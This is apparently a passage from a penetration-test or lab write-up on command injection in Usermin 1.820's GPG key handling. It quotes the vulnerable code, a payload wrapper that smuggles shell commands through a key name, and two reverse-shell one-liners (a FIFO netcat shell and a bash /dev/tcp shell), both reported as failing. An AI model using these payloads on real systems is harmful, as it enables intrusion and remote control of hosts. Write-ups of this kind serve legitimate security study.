[4] The injection point
--------------------------------------------------------------------------------
Usermin 1.820, gnupg-lib.pl:

  open(GPG, "$gpgpath --fingerprint \"$_[0]->{'name'}->[0]\" 2>/dev/null |");

The key display name is interpolated into a shell pipeline. Payload wrapper:

  name = '";<command>echo "'

Resulting command line:

  gpg --fingerprint "";<command>echo "" 2>/dev/null |

A payload that does not end in ';' concatenates with the appended echo and fails with
"Bad fd number" before executing.


[5] Reverse shell — did not arrive
--------------------------------------------------------------------------------
$ nc -lvnp 1337
(listening; no connection)
$ nc -lvnp 1377
(listening; no connection)

The FIFO payload (rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f)
leaves the CGI hanging because `cat /tmp/f` blocks. The HTTP request therefore ends in a
ConnectionError whether or not the shell connected. That error is not evidence either way.
Callback on 1377 with a plain `bash -c 'bash -i >& /dev/tcp/...'` also never arrived.

Conclusion: injection works, egress does not. The exploit is used as a file-write primitive.
